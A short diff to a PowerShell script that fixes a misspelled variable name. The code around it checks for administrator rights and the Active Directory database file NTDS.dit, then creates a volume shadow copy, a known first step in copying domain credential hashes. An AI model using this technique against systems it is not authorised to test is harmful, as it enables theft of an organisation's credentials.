@@ -157,9 +157,9 @@ param (
 	elseif ($CopyNtds -and $Dest) {
 		
 		$CheckElevated = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
-		$NTDSxists = (Test-Path "C:\windows\NTDS\NTDS.dit") 
+		$NTDSExists = (Test-Path "C:\windows\NTDS\NTDS.dit") 
 		
-		if ($CheckElevated -and $NTDSxists) {
+		if ($CheckElevated -and $NTDSExists) {
 			# create shadow copy
 			$class = [WMICLASS]"root\cimv2:win32_shadowcopy"
 			$class.create("C:\", "ClientAccessible")
